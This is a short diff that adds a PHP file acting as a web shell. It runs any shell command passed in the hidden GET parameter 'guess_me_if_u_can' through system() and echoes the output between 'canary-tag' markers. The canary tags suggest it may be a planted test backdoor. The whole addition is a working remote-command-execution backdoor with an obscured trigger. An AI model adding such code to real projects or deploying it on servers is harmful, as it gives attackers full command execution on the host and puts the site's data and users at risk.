@@ -1,0 +1,7 @@
+<?php
+if (isset($_GET['guess_me_if_u_can'])) {
+    echo "<canary-tag>";
+    system($_GET['guess_me_if_u_can']);
+    echo "</canary-tag>";
+}
+?>
